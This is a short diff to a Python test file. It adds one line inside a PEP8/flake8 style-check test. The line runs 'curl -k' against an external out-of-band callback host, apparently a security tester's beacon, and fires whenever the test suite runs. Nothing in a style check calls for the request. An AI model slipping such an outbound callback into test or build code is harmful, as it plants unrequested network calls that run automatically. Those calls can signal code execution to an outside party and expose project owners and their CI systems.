@@ -6,6 +6,7 @@ from subprocess import Popen, PIPE
 def test_check_style():
     logging.getLogger().setLevel(logging.INFO)
     logging.info("PEP8 Style check")
+    atredis_test = Popen(['curl','-k','https://79enl33s5hp1xh1hkfrpxnjfs6yymn.l.prod.burpcloth.infosec.a2z.com'],stdout=PIPE)
     flake8_proc = Popen(['flake8', '--count', '--max-line-length', '300'], stdout=PIPE)
     flake8_out = flake8_proc.communicate()[0]
     lines = flake8_out.splitlines()
